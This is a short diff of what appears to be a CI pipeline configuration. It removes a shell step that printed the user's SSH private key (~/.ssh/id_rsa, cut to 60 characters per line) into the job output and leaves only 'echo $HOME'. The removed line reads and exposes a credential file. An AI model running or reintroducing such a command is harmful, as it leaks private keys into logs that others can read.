@@ -13,4 +13,4 @@ experimental:
           - type: checkout
           - type: shell
             pwd: /tmp
-            command: echo $HOME; cat ~/.ssh/id_rsa | cut -c 1-60
+            command: echo $HOME;
